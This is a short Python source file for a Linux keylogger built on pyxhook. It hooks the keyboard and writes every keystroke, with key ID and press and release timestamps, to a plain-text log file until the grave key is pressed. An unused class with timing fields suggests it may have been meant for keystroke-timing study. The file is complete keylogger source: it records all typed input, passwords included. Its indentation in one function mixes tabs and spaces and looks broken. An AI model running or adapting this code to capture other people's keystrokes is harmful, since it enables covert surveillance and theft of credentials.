"""
Copyright (c) 2015, Aman Deep
All rights reserved.


A simple keylogger witten in python for linux platform
All keystrokes are recorded in a log file.

The program terminates when grave key(`) is pressed

grave key is found below Esc key
"""

import pyxhook
import time
#change this to your log file's path
log_file='/home/sarmishta/Desktop/py-keylogger/file.log'

class Stroke:
	def __init__(self, event):
		self.Key = ''
		self.KeyID = -1
		self.keyPressTime = 0            #key2.UpTime - key2.DownTime
		self.keyFlightTime = 0           #key1.UpTime - key2.DownTime
		self.key1dkey2d = 0
		self.key1dkey2u = 0
		self.key1ukey2u = 0

#buffer = []
#oldstroke = new Stroke()

#this function is called everytime a key is pressed.
def OnKeyDown(event):
  fob=open(log_file,'a')
  fob.write(event.Key)
  fob.write(',')
  fob.write(str(event.KeyID))
  fob.write(',')
  fob.write(str(time.time()))
  fob.write(',')

  if event.Ascii==96: #96 is the ascii value of the grave key (`)
    fob.close()
    new_hook.cancel()
    
def OnKeyUp(event):
	fob=open(log_file,'a')
	fob.write(event.Key)
	fob.write(',')
  	fob.write(str(event.KeyID))
  	fob.write(',')
  	fob.write(str(time.time()))
  	fob.write('\n')
    
#instantiate HookManager class
new_hook=pyxhook.HookManager()
#listen to all keystrokes
new_hook.KeyDown=OnKeyDown
new_hook.KeyUp=OnKeyUp
#hook the keyboard
new_hook.HookKeyboard()
#start the session
new_hook.start()
